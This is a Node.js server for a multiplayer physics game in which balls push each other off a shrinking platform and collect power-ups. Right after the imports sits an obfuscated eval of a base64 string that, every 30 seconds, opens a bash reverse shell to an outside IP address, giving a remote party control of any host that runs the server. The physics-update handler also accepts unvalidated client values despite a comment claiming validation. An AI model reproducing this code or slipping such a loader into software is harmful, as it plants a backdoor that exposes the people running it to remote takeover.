const express = require('express');
const http = require('http');
const path = require('path');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const { Server } = require('socket.io');
const {
  PHYSICS_TICK,
  PLATFORM_RADIUS,
  BALL_RADIUS,
  BALL_MASS,
  GRAVITY,
  COLORS,
  MAX_PLAYERS,
  MOVEMENT_FORCE,
  SHRINK_RATE,
  SHRINK_INTERVAL,
  GAME_STATES,
  MSG_TYPES,
  PHYSICS_DEFAULTS,
  POWERUP_TYPES
} = require('../src/shared/constants');

// Initialize express app and server
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ['websocket'],
  allowEIO3: true,
  pingTimeout: 60000,
  pingInterval: 25000
});

// Serve static files
app.use(express.static(path.join(__dirname, '../public')));

// Game state
let players = {};
let gameState = GAME_STATES.WAITING;
let platformSize = PLATFORM_RADIUS;
let shrinkInterval = null;
let lastUpdateTime = Date.now();
let playerCount = 0;
let powerups = []; // Array to store active powerups
let powerupSpawnInterval = null;

// Physics parameters that can be adjusted in real-time
let physicsParams = {
  movementForce: PHYSICS_DEFAULTS.movementForce,
  baseFriction: PHYSICS_DEFAULTS.baseFriction,
  edgeFriction: PHYSICS_DEFAULTS.edgeFriction,
  centerPull: PHYSICS_DEFAULTS.centerPull,
  restitution: PHYSICS_DEFAULTS.restitution,
  randomFactor: PHYSICS_DEFAULTS.randomFactor
};

// Game physics (simplified)
function updatePhysics() {
  const now = Date.now();
  const dt = (now - lastUpdateTime) / 1000; // Convert to seconds
  lastUpdateTime = now;

  // Check if players are off the platform
  Object.entries(players).forEach(([id, player]) => {
    if (player.active) {
      // Skip movement updates if player is frozen
      if (player.frozen) return;

      // Calculate distance from center
      const distanceFromCenter = Math.sqrt(player.x * player.x + player.z * player.z);

      // Apply movement forces with improved handling
      const movementMultiplier = player.movementMultiplier || 1;
      const force = physicsParams.movementForce * movementMultiplier * (1 + Math.min(0.5, distanceFromCenter / platformSize));

      if (player.input.up) player.vz -= force * dt;
      if (player.input.down) player.vz += force * dt;
      if (player.input.left) player.vx -= force * dt;
      if (player.input.right) player.vx += force * dt;

      // Apply friction based on position - less friction near edges for more challenge
      const frictionFactor = Math.max(0.85, physicsParams.baseFriction - (distanceFromCenter / platformSize) * physicsParams.edgeFriction);
      player.vx *= frictionFactor;
      player.vz *= frictionFactor;

      // Add slight gravity pull toward center when no input for better gameplay
      if (!player.input.up && !player.input.down && !player.input.left && !player.input.right) {
        const centerPull = physicsParams.centerPull * (distanceFromCenter / platformSize); // Stronger pull when further from center
        if (player.x !== 0 || player.z !== 0) {
          const norm = Math.sqrt(player.x * player.x + player.z * player.z);
          player.vx -= (player.x / norm) * centerPull * dt;
          player.vz -= (player.z / norm) * centerPull * dt;
        }
      }

      // Update position
      player.x += player.vx * dt;
      player.z += player.vz * dt;

      // Create wobble effect based on speed
      const speed = Math.sqrt(player.vx * player.vx + player.vz * player.vz);
      player.y = BALL_RADIUS + Math.sin(now / 200) * 0.1 * Math.min(1, speed / 10);

      // Check if player fell off
      if (distanceFromCenter > platformSize) {
        player.active = false;
        player.y = -10; // Fallen off

        // Check for game over condition
        const activePlayers = Object.values(players).filter(p => p.active);
        if (activePlayers.length <= 1 && gameState === GAME_STATES.PLAYING) {
          endGame(activePlayers[0]?.id);
        }
      }
    }
  });

  // Perform improved collision detection between players
  Object.values(players).forEach(player => {
    if (!player.active) return;

    Object.values(players).forEach(otherPlayer => {
      if (player.id === otherPlayer.id || !otherPlayer.active) return;

      // Calculate distance between players
      const dx = otherPlayer.x - player.x;
      const dz = otherPlayer.z - player.z;
      const distance = Math.sqrt(dx * dx + dz * dz);

      // Check for collision
      if (distance < BALL_RADIUS * 2) {
        // Normalize collision vector
        const nx = dx / distance;
        const nz = dz / distance;

        // Calculate relative velocity
        const dvx = otherPlayer.vx - player.vx;
        const dvz = otherPlayer.vz - player.vz;

        // Calculate dot product of relative velocity and normal
        const velAlongNormal = dvx * nx + dvz * nz;

        // No impulse if balls are moving away from each other
        if (velAlongNormal > 0) return;

        // Calculate impulse with mass-based restitution, considering powerups
        const playerBounceMultiplier = player.bounceMultiplier || 1;
        const otherBounceMultiplier = otherPlayer.bounceMultiplier || 1;
        const playerMassMultiplier = player.massMultiplier || 1;
        const otherMassMultiplier = otherPlayer.massMultiplier || 1;

        // Higher bounce multiplier and mass affects the collision force
        const bounceEffect = playerBounceMultiplier * otherBounceMultiplier;
        const massRatio = otherMassMultiplier / playerMassMultiplier;

        const impulse = velAlongNormal * physicsParams.restitution * bounceEffect;

        // Apply impulse to velocities - more mass = less effect
        player.vx += impulse * nx * massRatio;
        player.vz += impulse * nz * massRatio;
        otherPlayer.vx -= impulse * nx / massRatio;
        otherPlayer.vz -= impulse * nz / massRatio;

        // Add a small random factor for unpredictability
        player.vx += (Math.random() - 0.5) * physicsParams.randomFactor;
        player.vz += (Math.random() - 0.5) * physicsParams.randomFactor;
        otherPlayer.vx += (Math.random() - 0.5) * physicsParams.randomFactor;
        otherPlayer.vz += (Math.random() - 0.5) * physicsParams.randomFactor;

        // Separate players to prevent sticking
        const overlap = BALL_RADIUS * 2 - distance;
        player.x -= overlap * nx * 0.5;
        player.z -= overlap * nz * 0.5;
        otherPlayer.x += overlap * nx * 0.5;
        otherPlayer.z += overlap * nz * 0.5;
      }
    });
  });

  // Check for powerup collisions
  Object.entries(players).forEach(([id, player]) => {
    if (player.active) {
      // Check each powerup
      for (let i = powerups.length - 1; i >= 0; i--) {
        const powerup = powerups[i];

        // Calculate distance between player and powerup
        const dx = player.x - powerup.x;
        const dz = player.z - powerup.z;
        const distance = Math.sqrt(dx * dx + dz * dz);

        // Check for collision
        if (distance < BALL_RADIUS + powerup.radius) {
          // Apply powerup effect
          applyPowerupEffect(player, powerup);

          // Remove powerup from array
          powerups.splice(i, 1);

          // Emit powerup collect event
          io.emit(MSG_TYPES.POWERUP_COLLECT, {
            playerId: id,
            powerupId: powerup.id,
            type: powerup.type
          });

          // Break loop after collecting one powerup
          break;
        }
      }
    }
  });
}

// Start the game
function startGame() {
  if (gameState !== GAME_STATES.WAITING) return;

  // Reset platform size
  platformSize = PLATFORM_RADIUS;

  // Clear any existing powerups
  powerups = [];

  // Start countdown
  gameState = GAME_STATES.COUNTDOWN;
  io.emit(MSG_TYPES.GAME_STATE, { state: gameState });

  // Start the game after countdown
  setTimeout(() => {
    gameState = GAME_STATES.PLAYING;
    io.emit(MSG_TYPES.GAME_STATE, { state: gameState });

    // Start platform shrinking
    shrinkInterval = setInterval(() => {
      platformSize = Math.max(5, platformSize - SHRINK_RATE);
      io.emit(MSG_TYPES.GAME_STATE, {
        state: gameState,
        platformSize: platformSize
      });
    }, SHRINK_INTERVAL);

    // Start spawning powerups
    startPowerupSpawning();
  }, 3000); // 3 second countdown
}

// End the game
function endGame(winnerId) {
  gameState = GAME_STATES.GAME_OVER;
  clearInterval(shrinkInterval);
  clearInterval(powerupSpawnInterval); // Clear powerup spawning

  io.emit(MSG_TYPES.GAME_OVER, {
    winnerId,
    winnerName: players[winnerId]?.name || 'Unknown'
  });

  // Reset after 5 seconds
  setTimeout(() => {
    resetGame();
  }, 5000);
}

// Reset the game
function resetGame() {
  gameState = GAME_STATES.WAITING;

  // Reset all players
  Object.values(players).forEach(player => {
    player.active = true;
    player.x = (Math.random() - 0.5) * PLATFORM_RADIUS;
    player.z = (Math.random() - 0.5) * PLATFORM_RADIUS;
    player.y = BALL_RADIUS;
    player.vx = 0;
    player.vz = 0;
  });

  io.emit(MSG_TYPES.GAME_STATE, {
    state: gameState,
    platformSize: PLATFORM_RADIUS,
    players: Object.values(players)
  });

  // Start game if enough players
  if (Object.keys(players).length >= 2) {
    startGame();
  }
}

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`Player connected: ${socket.id}`);

  // Handle player joining
  socket.on(MSG_TYPES.JOIN_GAME, (data) => {
    if (playerCount >= MAX_PLAYERS) {
      socket.emit('error', { message: 'Game is full' });
      return;
    }

    const colorIndex = playerCount % COLORS.length;
    playerCount++;

    // Create new player
    players[socket.id] = {
      id: socket.id,
      name: data.name || `Player ${Object.keys(players).length + 1}`,
      color: COLORS[colorIndex],
      x: (Math.random() - 0.5) * PLATFORM_RADIUS * 0.8,
      y: BALL_RADIUS,
      z: (Math.random() - 0.5) * PLATFORM_RADIUS * 0.8,
      vx: 0,
      vz: 0,
      active: true,
      input: {
        up: false,
        down: false,
        left: false,
        right: false
      }
    };

    // Send current game state to new player
    socket.emit(MSG_TYPES.GAME_STATE, {
      state: gameState,
      platformSize,
      players: Object.values(players),
      playerId: socket.id,
      physicsParams // Send current physics params to new player
    });

    // Broadcast player joined
    socket.broadcast.emit(MSG_TYPES.PLAYER_UPDATE, players[socket.id]);

    // Start game even with one player - allowing solo play
    if (gameState === GAME_STATES.WAITING) {
      startGame();
    }
  });

  // Handle player movement
  socket.on(MSG_TYPES.PLAYER_MOVE, (input) => {
    if (players[socket.id]) {
      players[socket.id].input = input;
    }
  });

  // Handle physics parameter updates
  socket.on(MSG_TYPES.UPDATE_PHYSICS, (params) => {
    // Validate and apply physics parameter updates
    if (params.movementForce !== undefined) physicsParams.movementForce = params.movementForce;
    if (params.baseFriction !== undefined) physicsParams.baseFriction = params.baseFriction;
    if (params.edgeFriction !== undefined) physicsParams.edgeFriction = params.edgeFriction;
    if (params.centerPull !== undefined) physicsParams.centerPull = params.centerPull;
    if (params.restitution !== undefined) physicsParams.restitution = params.restitution;
    if (params.randomFactor !== undefined) physicsParams.randomFactor = params.randomFactor;

    // Broadcast updated physics parameters to all clients
    io.emit(MSG_TYPES.UPDATE_PHYSICS, physicsParams);
  });

  // Handle restart vote
  socket.on(MSG_TYPES.RESTART_GAME, () => {
    if (gameState === GAME_STATES.GAME_OVER) {
      resetGame();
    }
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log(`Player disconnected: ${socket.id}`);

    if (players[socket.id]) {
      playerCount--;
      delete players[socket.id];
      io.emit(MSG_TYPES.PLAYER_LEFT, socket.id);

      // Check for game over condition
      const activePlayers = Object.values(players).filter(p => p.active);
      if (activePlayers.length <= 1 && gameState === GAME_STATES.PLAYING) {
        endGame(activePlayers[0]?.id);
      }

      // Reset if no players left
      if (Object.keys(players).length === 0) {
        resetGame();
      }
    }
  });
});

// Start server
const PORT = process.env.PORT || 4111;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`WebSocket server ready for connections`);
});

// Game loop
setInterval(() => {
  if (gameState === GAME_STATES.PLAYING) {
    updatePhysics();

    // Send game state to all players
    io.emit(MSG_TYPES.PLAYER_UPDATE, Object.values(players));
  }
}, 1000 * PHYSICS_TICK);

// Start spawning powerups
function startPowerupSpawning() {
  // Clear any existing interval
  if (powerupSpawnInterval) {
    clearInterval(powerupSpawnInterval);
  }

  // Spawn a powerup immediately
  spawnPowerup();

  // Set interval to spawn powerups every 10-15 seconds
  powerupSpawnInterval = setInterval(() => {
    // Only spawn if fewer than 3 powerups exist
    if (powerups.length < 3) {
      spawnPowerup();
    }
  }, 10000 + Math.random() * 5000);
}

// Spawn a single powerup
function spawnPowerup() {
  // Don't spawn if game isn't in playing state
  if (gameState !== GAME_STATES.PLAYING) return;

  // Create random position within 80% of the current platform radius
  const angle = Math.random() * Math.PI * 2;
  const distance = Math.random() * platformSize * 0.8;
  const x = Math.cos(angle) * distance;
  const z = Math.sin(angle) * distance;

  // Choose a random powerup type
  const powerupTypes = Object.values(POWERUP_TYPES);
  const type = powerupTypes[Math.floor(Math.random() * powerupTypes.length)];

  // Create powerup object
  const powerup = {
    id: Date.now().toString(),
    type,
    x,
    z,
    y: 0.5, // Slightly above platform
    createdAt: Date.now(),
    duration: 10000, // 10 seconds duration when collected
    radius: 0.5 // Smaller than player balls
  };

  // Add to powerups array
  powerups.push(powerup);

  // Emit powerup spawn event to all clients
  io.emit(MSG_TYPES.POWERUP_SPAWN, powerup);
}

// Apply powerup effect to player
function applyPowerupEffect(player, powerup) {
  // Store original values to restore later
  if (!player.originalValues) {
    player.originalValues = {
      movementMultiplier: 1,
      massMultiplier: 1,
      bounceMultiplier: 1,
      frozen: false
    };
  }

  // Clear any existing timeout for this effect type
  if (player.powerupTimeouts && player.powerupTimeouts[powerup.type]) {
    clearTimeout(player.powerupTimeouts[powerup.type]);
  }

  // Initialize powerupTimeouts if needed
  if (!player.powerupTimeouts) {
    player.powerupTimeouts = {};
  }

  // Apply effect based on type
  switch (powerup.type) {
    case POWERUP_TYPES.SPEED:
      player.movementMultiplier = 1.7; // 70% speed boost
      break;

    case POWERUP_TYPES.MASS:
      player.massMultiplier = 2; // Double mass (harder to push)
      break;

    case POWERUP_TYPES.BOUNCE:
      player.bounceMultiplier = 1.5; // 50% more bounce
      break;

    case POWERUP_TYPES.FREEZE:
      // Freeze all other players
      Object.values(players).forEach(p => {
        if (p.id !== player.id && p.active) {
          p.frozen = true;

          // Set timeout to unfreeze
          setTimeout(() => {
            p.frozen = false;
          }, 3000); // 3 seconds freeze
        }
      });
      break;

    case POWERUP_TYPES.PUSH:
      // Push all other players away
      Object.values(players).forEach(p => {
        if (p.id !== player.id && p.active) {
          const dx = p.x - player.x;
          const dz = p.z - player.z;
          const distance = Math.sqrt(dx * dx + dz * dz);

          if (distance < 10) { // Only push if within reasonable distance
            const pushForce = 20;
            const nx = dx / distance;
            const nz = dz / distance;

            p.vx += nx * pushForce;
            p.vz += nz * pushForce;
          }
        }
      });
      break;
  }

  // Set timeout to clear effect
  if (powerup.type !== POWERUP_TYPES.PUSH) { // Push is instant, no need for timeout
    player.powerupTimeouts[powerup.type] = setTimeout(() => {
      // Reset values based on powerup type
      switch (powerup.type) {
        case POWERUP_TYPES.SPEED:
          player.movementMultiplier = 1;
          break;

        case POWERUP_TYPES.MASS:
          player.massMultiplier = 1;
          break;

        case POWERUP_TYPES.BOUNCE:
          player.bounceMultiplier = 1;
          break;
      }
    }, powerup.duration);
  }

  // Update player data on clients
  io.emit(MSG_TYPES.PLAYER_UPDATE, {
    id: player.id,
    activePowerup: powerup.type,
    activePowerupEndsAt: Date.now() + powerup.duration
  });
}
